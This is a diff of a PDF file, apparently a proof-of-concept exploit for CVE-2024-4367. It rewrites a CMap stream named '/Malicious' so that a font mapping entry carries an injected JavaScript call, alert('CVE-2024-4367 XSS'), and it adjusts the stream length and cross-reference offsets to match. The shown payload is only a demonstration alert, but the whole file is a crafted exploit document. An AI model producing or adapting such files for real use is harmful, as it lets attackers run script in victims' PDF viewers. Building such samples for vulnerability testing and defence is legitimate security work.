@@ -28,16 +28,19 @@ endobj
 << /Type /FontDescriptor /FontName /Helvetica /Flags 32 /FontBBox [-166 -225 1000 931] /ItalicAngle 0 /Ascent 770 /Descent -230 /CapHeight 717 /StemV 88 >>
 endobj
 8 0 obj
-<< /Length 78 >>
+<< /Length 85 >>
 stream
 begincmap
 /CMapName /Malicious def
 /CIDSystemInfo << /Registry (Adobe) /Ordering (UCS) /Supplement 0 >> def
 /CMapVersion 1 def
 /CMapType 2 def
-1 beginbfrange
-<0001> <0001> <0048> (0);alert('CVE-2024-4367 XSS')
-endbfrange
+1 begincodespacerange
+<0000> <FFFF>
+endcodespacerange
+1 beginbfchar
+<0001> <0020> alert("CVE-2024-4367 XSS")
+endbfchar
 endcmap
 endstream
 endobj
@@ -51,9 +54,9 @@ xref
 0000000238 00000 n 
 0000000276 00000 n 
 0000000388 00000 n 
-0000000482 00000 n 
+0000000489 00000 n 
 trailer
 << /Size 9 /Root 1 0 R >>
 startxref
-570
+580
 %%EOF
